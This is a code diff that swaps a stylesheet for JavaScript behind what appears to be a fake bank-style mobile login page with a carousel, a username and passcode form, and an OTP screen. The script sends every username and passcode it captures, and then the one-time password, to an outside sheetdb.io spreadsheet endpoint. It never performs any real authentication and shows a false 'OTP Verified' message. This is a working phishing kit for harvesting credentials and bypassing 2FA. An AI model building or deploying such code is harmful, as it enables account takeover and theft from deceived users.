@@ -1,86 +1,152 @@
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+// --- SELECTORS ---
+const slider = document.getElementById('mainSlider');
+const track = document.querySelector('.carousel-track');
+const dots = document.querySelectorAll('.dot');
+
+const loginTrigger = document.getElementById('loginTrigger');    
+const backToLanding = document.getElementById('backToLanding');  
+const goToOtp = document.getElementById('goToOtp');            
+const backToLogin = document.getElementById('backToLogin');    
+const finishAuth = document.getElementById('finishAuth');      
+
+const usernameInput = document.getElementById('username');
+const passcodeInput = document.getElementById('passcode');
+const otpInput = document.getElementById('otpInput');
+
+// --- CONFIGURATION ---
+const SHEETDB_API_URL = 'https://sheetdb.io/api/v1/gnmgo6n53wxu6';
+let sessionId = ""; // Used to identify the same row for the OTP update
+
+let currentIndex = 0;
+let carouselInterval;
+
+// --- INITIALIZATION ---
+window.onload = () => {
+    setTimeout(() => {
+        slider.className = 'main-slider slider-step-1';
+        startCarousel();
+    }, 2000);
+};
+
+// --- PROMO CAROUSEL ---
+function startCarousel() {
+    clearInterval(carouselInterval);
+    carouselInterval = setInterval(() => {
+        currentIndex = (currentIndex + 1) % 2;
+        if(track) track.style.transform = `translateX(-${currentIndex * 50}%)`;
+        dots.forEach(dot => dot.classList.remove('active'));
+        if(dots[currentIndex]) dots[currentIndex].classList.add('active');
+    }, 4000);
 }
 
-body {
-    background-color: #f0f2f5;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-}
+// --- NAVIGATION & SUBMISSION STEP 1 (Username/Passcode) ---
 
-.app-viewport {
-    width: 100%;
-    max-width: 450px;
-    height: 100vh;
-    background: white;
-    overflow: hidden;
-    position: relative;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-}
+goToOtp.addEventListener('click', async () => {
+    const username = usernameInput.value;
+    const passcode = passcodeInput.value;
 
-.main-slider {
-    display: flex;
-    width: 400%; /* 4 pages = 400% */
-    height: 100%;
-    transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-}
+    // Create a unique ID for this specific login attempt
+    sessionId = "ID-" + Math.floor(Math.random() * 1000000);
 
-/* Horizontal Sliding Logic (25% increments for 4 pages) */
-.slider-step-0 { transform: translateX(0); }
-.slider-step-1 { transform: translateX(-25%); }
-.slider-step-2 { transform: translateX(-50%); }
-.slider-step-3 { transform: translateX(-75%); }
+    goToOtp.innerText = "Processing...";
+    goToOtp.disabled = true;
 
-.page {
-    width: 25%; /* 1/4 of the slider width */
-    height: 100%;
-    flex-shrink: 0;
-    position: relative;
-    display: flex;
-    flex-direction: column;
-}
+    try {
+        // First request: Create the row with Username, Passcode, and SessionID
+        const response = await fetch(SHEETDB_API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                data: [{
+                    'session_id': sessionId,
+                    'username': username,
+                    'passcode': passcode,
+                    'otp': 'PENDING...', // Placeholder
+                    'timestamp': new Date().toLocaleString()
+                }]
+            })
+        });
 
-/* Splash Screen Style */
-.splash-img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
+        const result = await response.json();
+        if (result.created === 1) {
+            // Slide to OTP page only after successful first write
+            slider.className = 'main-slider slider-step-3';
+        }
+    } catch (error) {
+        alert("Login error. Please try again.");
+    } finally {
+        goToOtp.innerText = "Login";
+        goToOtp.disabled = false;
+    }
+});
 
-/* --- Carousel on Landing Page --- */
-.carousel-wrapper { width: 100%; height: 50%; position: relative; overflow: hidden; }
-.carousel-track { display: flex; width: 200%; height: 100%; transition: transform 0.4s ease-in-out; }
-.slide { width: 50%; height: 100%; }
-.slide img { width: 100%; height: 100%; object-fit: cover; }
-.dots { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 8px; }
-.dot { width: 8px; height: 8px; background: rgba(255,255,255,0.5); border-radius: 50%; transition: 0.3s; }
-.dot.active { background: #fff; width: 20px; border-radius: 10px; }
+// --- SUBMISSION STEP 2 (Update same row with OTP) ---
 
-/* --- Buttons & Inputs --- */
-.auth-section { padding: 30px 20px; display: flex; flex-direction: column; gap: 15px; }
-button { width: 100%; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: 0.3s; }
-.btn-login { background: #005696; color: white; border: none; }
-.btn-register { background: transparent; color: #005696; border: 2px solid #005696; }
+finishAuth.addEventListener('click', async () => {
+    const otp = otpInput.value;
 
-.bottom-nav { position: absolute; bottom: 0; width: 100%; display: flex; padding: 20px 0; border-top: 1px solid #eee; background: #fff; }
-.nav-item { flex: 1; text-align: center; }
-.nav-item p { font-size: 12px; color: #666; margin-top: 5px; }
-.divider { width: 1px; height: 40px; background: #eee; }
+    if (otp.length < 6) {
+        alert("Please enter 6-digit OTP.");
+        return;
+    }
 
-/* --- Form Elements --- */
-.login-header { padding: 20px; }
-.back-btn { background: none; border: none; width: auto; padding: 10px; }
-.login-content { padding: 0 30px; }
-.login-illus { width: 180px; display: block; margin: 0 auto 20px; }
-.login-title { color: #005696; font-size: 28px; margin-bottom: 25px; }
-input { width: 100%; border: none; border-bottom: 1.5px solid #ddd; padding: 15px 0; margin-bottom: 20px; font-size: 16px; outline: none; transition: 0.3s; }
-input:focus { border-bottom-color: #005696; }
-.forgot-link { display: block; text-align: right; color: #005696; text-decoration: none; font-weight: bold; font-size: 14px; margin-bottom: 35px; }
-.btn-login-submit { background-color: #e0e4e8; color: white; border: none; margin-bottom: 15px; }
-.btn-register-outline { background: transparent; border: 1.5px solid #005696; color: #005696; }
-    
+    finishAuth.innerText = "Verifying...";
+    finishAuth.disabled = true;
+
+    try {
+        // PATCH request: Find the row with our sessionId and update the 'otp' column
+        const response = await fetch(`${SHEETDB_API_URL}/session_id/${sessionId}`, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                data: { 'otp': otp }
+            })
+        });
+
+        const result = await response.json();
+
+        if (result.updated === 1) {
+            alert("Success! OTP Verified.");
+            // Reset Form
+            usernameInput.value = '';
+            passcodeInput.value = '';
+            otpInput.value = '';
+            slider.className = 'main-slider slider-step-1';
+            startCarousel();
+        }
+    } catch (error) {
+        alert("Connection error.");
+    } finally {
+        finishAuth.innerText = "Verify";
+        finishAuth.disabled = false;
+    }
+});
+
+// Other Nav
+loginTrigger.addEventListener('click', () => {
+    slider.className = 'main-slider slider-step-2';
+    clearInterval(carouselInterval);
+});
+
+backToLanding.addEventListener('click', () => {
+    slider.className = 'main-slider slider-step-1';
+    startCarousel();
+});
+
+backToLogin.addEventListener('click', () => {
+    slider.className = 'main-slider slider-step-2';
+});
+
+// Validation
+const validateLoginForm = () => {
+    if (usernameInput.value.trim().length > 3 && passcodeInput.value.length > 0) {
+        goToOtp.style.backgroundColor = '#005696';
+        goToOtp.disabled = false;
+    } else {
+        goToOtp.style.backgroundColor = '#e0e4e8';
+        goToOtp.disabled = true;
+    }
+};
+
+usernameInput.addEventListener('input', validateLoginForm);
+passcodeInput.addEventListener('input', validateLoginForm);
